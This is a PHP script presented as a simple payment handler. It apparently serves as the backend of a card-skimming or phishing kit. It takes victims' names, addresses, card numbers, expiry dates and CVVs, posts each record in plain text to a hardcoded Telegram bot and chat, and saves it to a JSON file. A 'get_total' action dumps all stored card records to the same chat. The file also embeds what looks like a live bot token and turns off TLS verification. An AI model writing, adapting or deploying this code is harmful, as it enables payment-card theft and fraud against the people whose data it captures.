<?php
/**
 * Simple Payment Handler for Alpine Linux
 * Handles payment data and sends to Telegram
 */

// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', '/var/www/html/data/error.log');

// CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');
header('Content-Type: application/json');

// Handle OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Telegram configuration
define('BOT_TOKEN', '7835330346:AAEAnJ2nNDQ3tUfiLfB8SgDFERzZ0fYA_Ac');
define('CHAT_ID', '-4844832082');
define('DATA_FILE', '/var/www/html/data/payments.json');

// Ensure data directory exists
if (!file_exists('/var/www/html/data')) {
    mkdir('/var/www/html/data', 0777, true);
}

// Get action
$action = $_GET['action'] ?? $_POST['action'] ?? '';

try {
    switch ($action) {
        case 'send_payment':
            handlePayment();
            break;
        case 'check_duplicate':
            checkDuplicate();
            break;
        case 'get_total':
            getTotalPayments();
            break;
        case 'test_bot':
            testBot();
            break;
        default:
            throw new Exception('Invalid action');
    }
} catch (Exception $e) {
    error_log('Payment Handler Error: ' . $e->getMessage());
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
}

/**
 * Handle payment submission
 */
function handlePayment() {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input) {
        throw new Exception('No input data received');
    }
    
    // Extract payment data
    $name = $input['name'] ?? '';
    $email = $input['email'] ?? '';
    $phone = $input['phone'] ?? '';
    $country = $input['country'] ?? '';
    $region = $input['region'] ?? '';
    $city = $input['city'] ?? '';
    $address = $input['address'] ?? '';
    $zip = $input['zip'] ?? '';
    $card = $input['card'] ?? '';
    $expiry = $input['expiry'] ?? '';
    $cvv = $input['cvv'] ?? '';
    $ip = $input['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    // Check for duplicate
    $isDuplicate = checkDuplicateData($card, $email);
    
    // Prepare message
    if ($isDuplicate) {
        $message = "DUPLICATE ENTRY DETECTED!\n\n";
    } else {
        $message = "Customer Information:\n";
    }
    
    $message .= "Name: $name\n";
    $message .= "Email: $email\n";
    $message .= "Phone: $phone\n";
    $message .= "Country: $country\n";
    $message .= "Region: $region\n";
    $message .= "City: $city\n";
    $message .= "Address: $address\n";
    $message .= "ZIP: $zip\n";
    $message .= "Payment Information:\n";
    $message .= "Card: $card\n";
    $message .= "Expiry: $expiry\n";
    $message .= "CVV: $cvv\n";
    $message .= "Technical Info:\n";
    $message .= "IP Address: $ip\n";
    $message .= "Time: " . time() . "\n";
    $message .= "User Agent: " . substr($userAgent, 0, 100) . "...";
    
    // Send to Telegram
    $success = sendTelegramMessage($message);
    
    if ($success && !$isDuplicate) {
        // Store payment data
        storePaymentData([
            'name' => $name,
            'email' => $email,
            'phone' => $phone,
            'country' => $country,
            'region' => $region,
            'city' => $city,
            'address' => $address,
            'zip' => $zip,
            'card' => $card,
            'expiry' => $expiry,
            'cvv' => $cvv,
            'ip' => $ip,
            'timestamp' => time(),
            'user_agent' => $userAgent
        ]);
    }
    
    echo json_encode([
        'success' => $success,
        'duplicate' => $isDuplicate,
        'message' => $success ? 'Payment data sent successfully' : 'Failed to send payment data'
    ]);
}

/**
 * Check for duplicate submission
 */
function checkDuplicateData($card, $email) {
    if (!file_exists(DATA_FILE)) {
        return false;
    }
    
    $data = json_decode(file_get_contents(DATA_FILE), true);
    if (!$data) {
        return false;
    }
    
    foreach ($data as $payment) {
        if ($payment['card'] === $card || $payment['email'] === $email) {
            return true;
        }
    }
    
    return false;
}

/**
 * Store payment data
 */
function storePaymentData($paymentData) {
    $data = [];
    if (file_exists(DATA_FILE)) {
        $existing = file_get_contents(DATA_FILE);
        if ($existing) {
            $data = json_decode($existing, true) ?: [];
        }
    }
    
    $data[] = $paymentData;
    file_put_contents(DATA_FILE, json_encode($data, JSON_PRETTY_PRINT));
}

/**
 * Get total payments (for /total command)
 */
function getTotalPayments() {
    if (!file_exists(DATA_FILE)) {
        $message = "No payment records found.";
    } else {
        $data = json_decode(file_get_contents(DATA_FILE), true);
        if (!$data) {
            $message = "No payment records found.";
        } else {
            $message = "TOTAL PAYMENT RECORDS:\n\n";
            foreach ($data as $index => $payment) {
                $num = $index + 1;
                $message .= "$num. " . $payment['name'] . "\n";
                $message .= $payment['email'] . "\n";
                $message .= $payment['phone'] . "\n";
                $message .= $payment['country'] . "\n";
                $message .= $payment['region'] . "\n";
                $message .= $payment['city'] . "\n";
                $message .= $payment['address'] . "\n";
                $message .= $payment['zip'] . "\n";
                $message .= $payment['card'] . "\n";
                $message .= $payment['expiry'] . "\n";
                $message .= $payment['cvv'] . "\n";
                $message .= $payment['ip'] . "\n";
                $message .= $payment['user_agent'] . "\n\n";
            }
            $message .= "Total Records: " . count($data);
        }
    }
    
    $success = sendTelegramMessage($message);
    echo json_encode(['success' => $success]);
}

/**
 * Test bot connection
 */
function testBot() {
    $message = "Bot test message - " . date('Y-m-d H:i:s');
    $success = sendTelegramMessage($message);
    echo json_encode(['success' => $success]);
}

/**
 * Send message to Telegram
 */
function sendTelegramMessage($message) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $message
    ];
    
    // Try cURL first
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'FockGaming Bot');
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            error_log("cURL Error: $error");
            return false;
        }
        
        if ($httpCode === 200 && $response) {
            $result = json_decode($response, true);
            return $result['ok'] ?? false;
        }
        
        error_log("HTTP Error: $httpCode - Response: $response");
        return false;
    }
    
    // Fallback to file_get_contents
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
            'timeout' => 30
        ]
    ];
    
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    
    if ($response) {
        $result = json_decode($response, true);
        return $result['ok'] ?? false;
    }
    
    return false;
}

/**
 * Check duplicate (separate endpoint)
 */
function checkDuplicate() {
    $input = json_decode(file_get_contents('php://input'), true);
    $card = $input['card'] ?? '';
    $email = $input['email'] ?? '';
    
    $isDuplicate = checkDuplicateData($card, $email);
    echo json_encode(['duplicate' => $isDuplicate]);
}
?>